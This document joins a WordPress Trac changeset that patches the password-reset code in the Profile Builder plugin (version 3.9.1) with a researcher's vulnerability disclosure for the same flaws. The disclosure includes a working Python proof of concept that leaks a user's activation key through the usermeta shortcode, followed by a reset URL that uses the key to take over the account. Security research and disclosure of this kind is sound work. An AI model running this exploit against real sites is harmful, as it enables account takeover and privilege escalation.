  | 372 | 366 | $output .= wppb\_password\_recovery\_error( $password\_change\_message, 'wppb\_recover\_password\_password\_changed\_message2' ); |
  | […](/browser/profile-builder/trunk/front-end/recover.php?rev=2801035#L395) | […](/browser/profile-builder/trunk/front-end/recover.php?rev=2864329#L389) |  |
  | 395 | 389 | $password\_changed\_success = true; |
  | 396 | 390 |  |
  | 397 |  |  |
  | 398 |  |  |
  | 399 |  | $userID = absint( $\_POST['userData'] ); |
  |  | 391 | $userID = $user->ID; |
  | 400 | 392 | $new\_pass = $\_POST['passw1']; // phpcs:ignore WordPress.Security.ValidatedSanitizedInput.InputNotSanitized, WordPress.Security.ValidatedSanitizedInput.MissingUnslash |
  | 401 | 393 |  |
  | […](/browser/profile-builder/trunk/front-end/recover.php?rev=2801035#L454) | […](/browser/profile-builder/trunk/front-end/recover.php?rev=2864329#L446) |  |
  | 454 | 446 |  |
  | 455 | 447 | //this is the part that shows the forms |
  | 456 |  | if( isset( $\_GET['key'] ) ){ |
  | 457 |  |  |
  | 458 |  | $key = sanitize\_text\_field( $\_GET['key'] ); |
  | 459 |  |  |
  | 460 |  | if( !empty( $key ) && !$password\_changed\_success ) { |
  | 461 |  |  |
  | 462 |  | //get the login name and key and verify if they match the ones in the database |
  | 463 |  | $user = $wpdb->get\_row( $wpdb->prepare( "SELECT \* FROM $wpdb->users WHERE user\_activation\_key = %s", $key ) ); |
  | 464 |  |  |
  | 465 |  | if( !empty( $user ) ) { |
  |  | 448 | if( isset( $\_GET['key'] ) && isset( $\_GET['login'] ) ){ |
  |  | 449 |  |
  |  | 450 | $key   = sanitize\_text\_field( $\_GET['key'] ); |
  |  | 451 | $login = sanitize\_text\_field( $\_GET['login'] ); |
  |  | 452 |  |
  |  | 453 | if( !empty( $key ) && !empty( $login ) && !$password\_changed\_success ) { |
  |  | 454 |  |
  |  | 455 | $user = check\_password\_reset\_key( $key, $login ); |
  |  | 456 |  |
  |  | 457 | if( !is\_wp\_error( $user ) ){ |
  |  | 458 |  |
  | 466 | 459 | ob\_start(); |
  | 467 |  | ~~wppb\_create\_recover\_password\_form($user, $\_POST~~); |
  | 468 |  | $output .= ob\_get\_contents(); |
  |  | 460 | wppb\_create\_recover\_password\_form( $user, $\_POST ); |
  |  | 461 | $output .= ob\_get\_contents(); |
  | 469 | 462 | ob\_end\_clean(); |
  | 470 |  | } |
  | 471 |  | else { |
  |  | 463 |  |
  |  | 464 | } else { |
  | 472 | 465 | $output .= wppb\_password\_recovery\_error('<b>' . \_\_('ERROR:', 'profile-builder') . '</b>' . \_\_('Invalid key!', 'profile-builder'), 'wppb\_recover\_password\_invalid\_key\_message'); |
  | 473 | 466 | } |
* ## [profile-builder/trunk/index.php](/changeset/2864329/profile-builder/trunk/index.php "Show the changeset 2864329 restricted to profile-builder/trunk/index.php")

  | [r2862446](/browser/profile-builder/trunk/index.php?rev=2862446#L4 "Show revision 2862446 of this file in browser") | [r2864329](/browser/profile-builder/trunk/index.php?rev=2864329#L4 "Show revision 2864329 of this file in browser") |  |
  | --- | --- | --- |
  | 4 | 4 | \* Plugin URI: https://www.cozmoslabs.com/wordpress-profile-builder/ |
  | 5 | 5 | \* Description: Login, registration and edit profile shortcodes for the front-end. Also you can choose what fields should be displayed or add new (custom) ones both in the front-end and in the dashboard. |
  | 6 |  | \* Version: 3.9.~~0~~ |
  |  | 6 | \* Version: 3.9.1 |
  | 7 | 7 | \* Author: Cozmoslabs |
  | 8 | 8 | \* Author URI: https://www.cozmoslabs.com/ |
  | […](/browser/profile-builder/trunk/index.php?rev=2862446#L10) | […](/browser/profile-builder/trunk/index.php?rev=2864329#L10) |  |
  | 10 | 10 | \* Domain Path: /translation |
  | 11 | 11 | \* License: GPL2 |
  | 12 |  | \* Elementor tested up to: 3.1~~0.2~~ |
  | 13 |  | \* Elementor Pro tested up to: 3.1~~0.2~~ |
  |  | 12 | \* Elementor tested up to: 3.11.0 |
  |  | 13 | \* Elementor Pro tested up to: 3.11.0 |
  | 14 | 14 | \* |
  | 15 | 15 | \* == Copyright == |
  | […](/browser/profile-builder/trunk/index.php?rev=2862446#L397) | […](/browser/profile-builder/trunk/index.php?rev=2864329#L397) |  |
  | 397 | 397 | \* |
  | 398 | 398 | \*/ |
  | 399 |  | define('PROFILE\_BUILDER\_VERSION', '3.9.~~0~~' ); |
  |  | 399 | define('PROFILE\_BUILDER\_VERSION', '3.9.1' ); |
  | 400 | 400 | define('WPPB\_PLUGIN\_DIR', plugin\_dir\_path(\_\_FILE\_\_)); |
  | 401 | 401 | define('WPPB\_PLUGIN\_URL', plugin\_dir\_url(\_\_FILE\_\_)); |
* ## [profile-builder/trunk/readme.txt](/changeset/2864329/profile-builder/trunk/readme.txt "Show the changeset 2864329 restricted to profile-builder/trunk/readme.txt")

  | [r2862446](/browser/profile-builder/trunk/readme.txt?rev=2862446#L5 "Show revision 2862446 of this file in browser") | [r2864329](/browser/profile-builder/trunk/readme.txt?rev=2864329#L5 "Show revision 2864329 of this file in browser") |  |
  | --- | --- | --- |
  | 5 | 5 | Requires at least: 3.1 |
  | 6 | 6 | Tested up to: 6.1 |
  | 7 |  | Stable tag: 3.9.~~0~~ |
  |  | 7 | Stable tag: 3.9.1 |
  | 8 | 8 | License: GPLv2 or later |
  | 9 | 9 | License URI: http://www.gnu.org/licenses/gpl-2.0.html |
  | […](/browser/profile-builder/trunk/readme.txt?rev=2862446#L178) | […](/browser/profile-builder/trunk/readme.txt?rev=2864329#L178) |  |
  | 178 | 178 |  |
  | 179 | 179 | == Changelog == |
  |  | 180 | = 3.9.1 = |
  |  | 181 | \* Fix: Improve security for password reset functionality. Thanks to Istvan Marton (Lana Codes) |
  |  | 182 | \* Fix: Disallow retrieval of certain user keys through the optional usermeta shortcode. Thanks to Istvan Marton (Lana Codes) |
  |  | 183 |  |
  | 180 | 184 | = 3.9.0 = |
  | 181 | 185 | \* Fix: Issue with the Email From filter |
* ## [profile-builder/trunk/translation/profile-builder.catalog.php](/changeset/2864329/profile-builder/trunk/translation/profile-builder.catalog.php "Show the changeset 2864329 restricted to profile-builder/trunk/translation/profile-builder.catalog.php")

  | [r2836042](/browser/profile-builder/trunk/translation/profile-builder.catalog.php?rev=2836042#L903 "Show revision 2836042 of this file in browser") | [r2864329](/browser/profile-builder/trunk/translation/profile-builder.catalog.php?rev=2864329#L903 "Show revision 2864329 of this file in browser") |  |
  | --- | --- | --- |
  | 903 | 903 | <?php \_\_("The password must not be empty!", "profile-builder"); ?> |
  | 904 | 904 | <?php \_\_("The key cannot be empty!", "profile-builder"); ?> |
  |  | 905 | <?php \_\_("Login cannot be empty!", "profile-builder"); ?> |
  | 905 | 906 | <?php \_\_("Invalid key!", "profile-builder"); ?> |
  | 906 | 907 | <?php \_\_("The entered passwords don't match!", "profile-builder"); ?> |
* ## [profile-builder/trunk/translation/profile-builder.pot](/changeset/2864329/profile-builder/trunk/translation/profile-builder.pot "Show the changeset 2864329 restricted to profile-builder/trunk/translation/profile-builder.pot")

  | [r2861357](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2861357#L850 "Show revision 2861357 of this file in browser") | [r2864329](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2864329#L850 "Show revision 2864329 of this file in browser") |  |
  | --- | --- | --- |
  | 850 | 850 | msgstr "" |
  | 851 | 851 |  |
  | 852 |  | #: admin/general-settings.php:314, front-end/login.php:540, front-end/recover.php:~~118~~, add-ons/email-customizer/email-customizer.php:29, add-ons/user-listing/userlisting.php:119, add-ons/user-listing/userlisting.php:891, add-ons/user-listing/userlisting.php:2568, features/admin-approval/class-admin-approval.php:177, features/email-confirmation/class-email-confirmation.php:169, features/email-customizer/email-customizer.php:29, add-ons-free/gdpr-communication-preferences/admin/manage-fields.php:24, add-ons-free/gdpr-communication-preferences/front-end/gdpr-communication-preferences.php:9, admin/advanced-settings/includes/shortcodes/resend-activation.php:9 |
  |  | 852 | #: admin/general-settings.php:314, front-end/login.php:540, front-end/recover.php:96, add-ons/email-customizer/email-customizer.php:29, add-ons/user-listing/userlisting.php:119, add-ons/user-listing/userlisting.php:891, add-ons/user-listing/userlisting.php:2568, features/admin-approval/class-admin-approval.php:177, features/email-confirmation/class-email-confirmation.php:169, features/email-customizer/email-customizer.php:29, add-ons-free/gdpr-communication-preferences/admin/manage-fields.php:24, add-ons-free/gdpr-communication-preferences/front-end/gdpr-communication-preferences.php:9, admin/advanced-settings/includes/shortcodes/resend-activation.php:9 |
  | 853 | 853 | msgid "Email" |
  | 854 | 854 | msgstr "" |
  | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2861357#L1442) | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2864329#L1442) |  |
  | 1442 | 1442 | msgstr "" |
  | 1443 | 1443 |  |
  | 1444 |  | #: admin/manage-fields.php:398, front-end/login.php:121, front-end/recover.php:~~72~~, add-ons/email-customizer/email-customizer.php:30, features/email-customizer/email-customizer.php:30 |
  |  | 1444 | #: admin/manage-fields.php:398, front-end/login.php:121, front-end/recover.php:49, add-ons/email-customizer/email-customizer.php:30, features/email-customizer/email-customizer.php:30 |
  | 1445 | 1445 | msgid "Password" |
  | 1446 | 1446 | msgstr "" |
  | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2861357#L1450) | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2864329#L1450) |  |
  | 1450 | 1450 | msgstr "" |
  | 1451 | 1451 |  |
  | 1452 |  | #: admin/manage-fields.php:399, front-end/recover.php:~~73~~ |
  |  | 1452 | #: admin/manage-fields.php:399, front-end/recover.php:50 |
  | 1453 | 1453 | msgid "Repeat Password" |
  | 1454 | 1454 | msgstr "" |
  | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2861357#L3366) | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2864329#L3366) |  |
  | 3366 | 3366 | msgstr "" |
  | 3367 | 3367 |  |
  | 3368 |  | #: features/functions.php:821, front-end/recover.php:38~~6~~, front-end/default-fields/password/password.php:59 |
  |  | 3368 | #: features/functions.php:821, front-end/recover.php:380, front-end/default-fields/password/password.php:59 |
  | 3369 | 3369 | msgid "The password must have a minimum strength of %s" |
  | 3370 | 3370 | msgstr "" |
  | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2861357#L3539) | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2864329#L3539) |  |
  | 3539 | 3539 | msgstr "" |
  | 3540 | 3540 |  |
  | 3541 |  | #: front-end/login.php:322, front-end/login.php:414, front-end/login.php:452, front-end/recover.php:18, front-end/recover.php:3~~26~~, features/two-factor-authentication/class-two-factor-authentication.php:577, front-end/default-fields/fields-functions.php:62, front-end/extra-fields/extra-fields.php:118 |
  |  | 3541 | #: front-end/login.php:322, front-end/login.php:414, front-end/login.php:452, front-end/recover.php:18, front-end/recover.php:309, features/two-factor-authentication/class-two-factor-authentication.php:577, front-end/default-fields/fields-functions.php:62, front-end/extra-fields/extra-fields.php:118 |
  | 3542 | 3542 | msgid "ERROR" |
  | 3543 | 3543 | msgstr "" |
  | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2861357#L3603) | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2864329#L3603) |  |
  | 3603 | 3603 | msgstr "" |
  | 3604 | 3604 |  |
  | 3605 |  | #: front-end/login.php:550, front-end/recover.php:1~~22~~ |
  |  | 3605 | #: front-end/login.php:550, front-end/recover.php:100 |
  | 3606 | 3606 | msgid "Username or Email" |
  | 3607 | 3607 | msgstr "" |
  | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2861357#L3615) | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2864329#L3615) |  |
  | 3615 | 3615 | msgstr "" |
  | 3616 | 3616 |  |
  | 3617 |  | #: front-end/recover.php:~~93~~ |
  |  | 3617 | #: front-end/recover.php:70 |
  | 3618 | 3618 | msgid "Reset Password" |
  | 3619 | 3619 | msgstr "" |
  | 3620 | 3620 |  |
  | 3621 |  | #: front-end/recover.php:~~121~~ |
  |  | 3621 | #: front-end/recover.php:99 |
  | 3622 | 3622 | msgid "Please enter your username or email address." |
  | 3623 | 3623 | msgstr "" |
  | 3624 | 3624 |  |
  | 3625 |  | #: front-end/recover.php:~~117~~ |
  |  | 3625 | #: front-end/recover.php:95 |
  | 3626 | 3626 | msgid "Please enter your email address." |
  | 3627 | 3627 | msgstr "" |
  | 3628 | 3628 |  |
  | 3629 |  | #: front-end/recover.php:1~~25~~ |
  |  | 3629 | #: front-end/recover.php:103 |
  | 3630 | 3630 | msgid "You will receive a link to create a new password via email." |
  | 3631 | 3631 | msgstr "" |
  | 3632 | 3632 |  |
  | 3633 |  | #: front-end/recover.php:1~~38~~ |
  |  | 3633 | #: front-end/recover.php:116 |
  | 3634 | 3634 | msgid "Get New Password" |
  | 3635 | 3635 | msgstr "" |
  | 3636 | 3636 |  |
  | 3637 |  | #: front-end/recover.php:1~~84~~ |
  |  | 3637 | #: front-end/recover.php:167 |
  | 3638 | 3638 | msgid "Someone requested that the password be reset for the following account: <b>%1$s</b><br/>If this was a mistake, just ignore this email and nothing will happen.<br/>To reset your password, visit the following link:%2$s" |
  | 3639 | 3639 | msgstr "" |
  | 3640 | 3640 |  |
  | 3641 |  | #: front-end/recover.php:1~~87~~ |
  |  | 3641 | #: front-end/recover.php:170 |
  | 3642 | 3642 | msgid "Password Reset from %1$s" |
  | 3643 | 3643 | msgstr "" |
  | 3644 | 3644 |  |
  | 3645 |  | #: front-end/recover.php:~~214~~ |
  |  | 3645 | #: front-end/recover.php:197 |
  | 3646 | 3646 | msgid "You have successfully reset your password." |
  | 3647 | 3647 | msgstr "" |
  | 3648 | 3648 |  |
  | 3649 |  | #: front-end/recover.php:~~216~~ |
  |  | 3649 | #: front-end/recover.php:199 |
  | 3650 | 3650 | msgid "Password Successfully Reset for %1$s on %2$s" |
  | 3651 | 3651 | msgstr "" |
  | 3652 | 3652 |  |
  | 3653 |  | #: front-end/recover.php:2~~34~~ |
  |  | 3653 | #: front-end/recover.php:217 |
  | 3654 | 3654 | msgid "%1$s has requested a password change via the password reset feature.<br/>His/her new password is:%2$s" |
  | 3655 | 3655 | msgstr "" |
  | 3656 | 3656 |  |
  | 3657 |  | #: front-end/recover.php:2~~71~~ |
  |  | 3657 | #: front-end/recover.php:254 |
  | 3658 | 3658 | msgid "You are already logged in. You can change your password on the edit profile form." |
  | 3659 | 3659 | msgstr "" |
  | 3660 | 3660 |  |
  | 3661 |  | #: front-end/recover.php:4~~46~~ |
  |  | 3661 | #: front-end/recover.php:438 |
  | 3662 | 3662 | msgid "The password must not be empty!" |
  | 3663 | 3663 | msgstr "" |
  | 3664 | 3664 |  |
  | 3665 |  | #: front-end/recover.php:3~~65~~ |
  |  | 3665 | #: front-end/recover.php:348 |
  | 3666 | 3666 | msgid "The key cannot be empty!" |
  | 3667 | 3667 | msgstr "" |
  | 3668 | 3668 |  |
  | 3669 |  | #: front-end/recover.php:371, front-end/recover.php:472 |
  |  | 3669 | #: front-end/recover.php:358 |
  |  | 3670 | msgid "Login cannot be empty!" |
  |  | 3671 | msgstr "" |
  |  | 3672 |  |
  |  | 3673 | #: front-end/recover.php:365, front-end/recover.php:465 |
  | 3670 | 3674 | msgid "Invalid key!" |
  | 3671 | 3675 | msgstr "" |
  | 3672 | 3676 |  |
  | 3673 |  | #: front-end/recover.php:37~~6~~ |
  |  | 3677 | #: front-end/recover.php:370 |
  | 3674 | 3678 | msgid "The entered passwords don't match!" |
  | 3675 | 3679 | msgstr "" |
  | 3676 | 3680 |  |
  | 3677 |  | #: front-end/recover.php:3~~82~~, front-end/default-fields/password/password.php:55 |
  |  | 3681 | #: front-end/recover.php:376, front-end/default-fields/password/password.php:55 |
  | 3678 | 3682 | msgid "The password must have the minimum length of %s characters" |
  | 3679 | 3683 | msgstr "" |
  | 3680 | 3684 |  |
  | 3681 |  | #: front-end/recover.php:3~~93~~ |
  |  | 3685 | #: front-end/recover.php:387 |
  | 3682 | 3686 | msgid "Your password has been successfully changed!" |
  | 3683 | 3687 | msgstr "" |
  | 3684 | 3688 |  |
  | 3685 |  | #: front-end/recover.php:2~~99~~ |
  |  | 3689 | #: front-end/recover.php:282 |
  | 3686 | 3690 | msgid "The username entered wasn't found in the database!" |
  | 3687 | 3691 | msgstr "" |
  | 3688 | 3692 |  |
  | 3689 |  | #: front-end/recover.php:2~~99~~ |
  |  | 3693 | #: front-end/recover.php:282 |
  | 3690 | 3694 | msgid "Please check that you entered the correct username." |
  | 3691 | 3695 | msgstr "" |
  | 3692 | 3696 |  |
  | 3693 |  | #: front-end/recover.php:3~~42~~ |
  |  | 3697 | #: front-end/recover.php:325 |
  | 3694 | 3698 | msgid "The email address entered wasn't found in the database!" |
  | 3695 | 3699 | msgstr "" |
  | 3696 | 3700 |  |
  | 3697 |  | #: front-end/recover.php:3~~42~~ |
  |  | 3701 | #: front-end/recover.php:325 |
  | 3698 | 3702 | msgid "Please check that you entered the correct email address." |
  | 3699 | 3703 | msgstr "" |
  | 3700 | 3704 |  |
  | 3701 |  | #: front-end/recover.php:~~312~~ |
  |  | 3705 | #: front-end/recover.php:295 |
  | 3702 | 3706 | msgid "Check your email for the confirmation link." |
  | 3703 | 3707 | msgstr "" |
  | 3704 | 3708 |  |
  | 3705 |  | #: front-end/recover.php:3~~26~~ |
  |  | 3709 | #: front-end/recover.php:309 |
  | 3706 | 3710 | msgid "There was an error while trying to send the activation link to %1$s!" |
  | 3707 | 3711 | msgstr "" |
  | 3708 | 3712 |  |
  | 3709 |  | #: front-end/recover.php:4~~72~~ |
  |  | 3713 | #: front-end/recover.php:465 |
  | 3710 | 3714 | msgid "ERROR:" |
  | 3711 | 3715 | msgstr "" |
  | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2861357#L4112) | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2864329#L4116) |  |
  | 4112 | 4116 | msgstr "" |
  | 4113 | 4117 |  |
  | 4114 |  | #: add-ons/email-customizer/email-customizer.php:60~~1, features/email-customizer/email-customizer.php:578~~ |
  |  | 4118 | #: add-ons/email-customizer/email-customizer.php:602, features/email-customizer/email-customizer.php:579 |
  | 4115 | 4119 | msgid "The users selected password at signup" |
  | 4116 | 4120 | msgstr "" |
  | 4117 | 4121 |  |
  | 4118 |  | #: add-ons/email-customizer/email-customizer.php:6~~09, add-ons/email-customizer/email-customizer.php:616, add-ons/email-customizer/email-customizer.php:630, features/email-confirmation/email-confirmation.php:618, features/email-customizer/email-customizer.php:586, features/email-customizer/email-customizer.php:593, features/email-customizer/email-customizer.php:607~~ |
  |  | 4122 | #: add-ons/email-customizer/email-customizer.php:610, add-ons/email-customizer/email-customizer.php:617, add-ons/email-customizer/email-customizer.php:631, features/email-confirmation/email-confirmation.php:618, features/email-customizer/email-customizer.php:587, features/email-customizer/email-customizer.php:594, features/email-customizer/email-customizer.php:608 |
  | 4119 | 4123 | msgid "Your selected password at signup" |
  | 4120 | 4124 | msgstr "" |

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=2864329)
* [Zip Archive](?format=zip&new=2864329)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from lana.codes_ffd84f9e_20250115_100853.html ===

[Skip to content](#content)

[![Lana Report](https://lana.report/wp-content/uploads/lana-report-inverse-text-logo-with-mascot.png)](https://lana.report/)

* [Front Page](https://lana.report/)
* [Reports](https://lana.report/vulnerability/)
* [Publications](https://lana.report/publication/)

1. [Lana Report](https://lana.report/)
2. [Publications](https://lana.report/publication/)

### Profile Builder by Cozmoslabs WordPress plugin Privilege Escalation

REPORT ID: 512e7307-04a5-4d8b-8f79-f75f37784a9f

The plugin contains an [Insecure Password Reset Mechanism](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2297) and a [Sensitive Information Disclosure via Shortcode](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0814) vulnerability, which leads to Privilege Escalation. The plugin has an improperly used method allowing to reset the user password, and gain unauthorized access. The key required for password reset, which is stored in the database, can be retrieved with the plugin’s shortcode as an authenticated user.

#### Let’s check the plugin

The `wppb_toolbox_usermeta_handler()` function gets user meta with the following code:

```
$value = $user->get( $atts['key'] );
```

There are no restrictions on what user meta values can be queried.

The `wppb_front_end_password_recovery()` function handles the password reset with the following code:

```
$key = sanitize_text_field( $_POST['key'] );
$user_object = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM $wpdb->users WHERE user_activation_key = %s", $key ) );
```

The problem is that it queries the user directly using the hashed activation key.

Note: In the core method, the key is sent via email to the user and then stored as hashed in the database. During password reset, the key sent via email is hashed and compared with the database stored hashed key for security reasons, as it prevents abuse of the stored hashed key in the database.

#### Let’s configure the plugin

In the Profile Builder Settings, select the “Yes” option for “Enable Usermeta shortcode” at “Advanced Settings” tab at “Shortcodes” subtab.

This setting allows the website to use the `[user_meta]` shortcode.

Let’s create a [Recover Password](https://lana.solutions/vdb/cozmoslabs-profile-builder/recover-password/) page and add the following shortcode to it:

```
[wppb-recover-password]
```
#### Let’s see how we can exploit this vulnerability

There is an AJAX parser for getting the value of the shortcode, which can be exploited with a logged-in user.

I created a Python script that returns the `user_activation_key`:

```
import json
import requests

# remove script tags from text
def remove_script_tags(text):
    import re
    clean = re.compile(r'<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>')
    return re.sub(clean, '', text).strip()

website_url = 'https://lana.solutions/vdb/cozmoslabs-profile-builder/'
username = 'demo'
password = 'demo'
user_id = '3'

# format url
website_url = website_url.rstrip('\/')

# create shortcode
shortcode = '[user_meta user_id="' + user_id + '" key="user_activation_key"]'

with requests.Session() as session:
    # login request
    session.post(website_url + '/wp-login.php', data={
        'log': username,
        'pwd': password
    })

    # parse shortcode request
    response = session.post(website_url + '/wp-admin/admin-ajax.php',
                            headers={'Content-Type': 'application/x-www-form-urlencoded'},
                            data={'action': 'parse-media-shortcode', 'shortcode': shortcode})

    response_json = json.loads(response.text)

    if response_json['success']:
        # get user_activation_key
        user_activation_key = remove_script_tags(response_json['data']['body'])
        print('user_activation_key: %s' % user_activation_key)
    else:
        # get error message
        print(response_json['data']['message'])

```

the script returns the user activation key as a string:

```
user_activation_key: 1675860449:$P$BzteMdaBIYji/hnP3IXQhddCmab1FL.
```

Then we can use the key for password reset.

For this, we have to open the Recover Password page, and add the key parameter to it:

```
https://lana.solutions/vdb/cozmoslabs-profile-builder/recover-password/?key=1675860449:$P$BzteMdaBIYji/hnP3IXQhddCmab1FL.
```

If the key is correct, we use the form to change the user’s password using the password and repeat password fields.

#### Try it

Feel free to try and use the lana.solutions/vdb WordPress websites for testing. I have set the roles and capabilities, so you can only get low level access to the website.

Website: <https://lana.solutions/vdb/cozmoslabs-profile-builder/>

### References

Source Code
<https://wordpress.org/plugins/profile-builder/>

Repository
<https://plugins.svn.wordpress.org/profile-builder/>

CVE
[CVE-2023-0814](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0814)

CVE
[CVE-2023-2297](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2297)

### Let's discuss

### Attributes

Catgory
WordPress Plugin

Vulnerability Discovered
2023-02-08

Post Published
2023-03-08

Post Updated
2023-05-20

Affected Version
<= 3.9.0

### Classification

Type
Privilege Escalation, Sensitive Information Disclosure

### Researcher

Name
[István Márton](https://lana.report "Visit István Márton’s website")

Email
[[email protected]](/cdn-cgi/l/email-protection#543d3a323b1438353a357a373b303127)

### Tags

exploit
password reset
php
privilege escalation
sensitive information disclosure
shortcode
wordpress plugin

### Advertisement

### Support Us?

We would truly appreciate it if you bought us a bunny (food for a snow leopard).

[![buy me a bunny!](https://img.buymeacoffee.com/button-api/?text=buy me a bunny!&emoji=🐰&slug=lanacodes&button_colour=0776eb&font_colour=ffffff&font_family=Lato&outline_colour=ffffff&coffee_colour=FFDD00)](https://www.buymeacoffee.com/lanacodes)

![](https://lana.report/wp-content/uploads/lana-report-inverse-text-logo-with-mascot.png)

The Lana Report is a database containing vulnerabilities researched and published by Lana Solutions.

### General

* [Vulnerabilities](https://lana.report/vulnerability/)
* [Publications](https://lana.report/publication/)

### Lana Solutions

* [Lana Codes](https://lana.codes/)
### Wordfence

* [Bug Bounty Program](https://wordfence.com/refer/lanareport)

### Socials

* [Telegram](https://t.me/LanaReport)
* [Twitter](https://twitter.com/LanaReport)

Lana Report © 2024 All Rights Reserved.

Made with 💙 by [Lana Codes](https://lana.codes/)


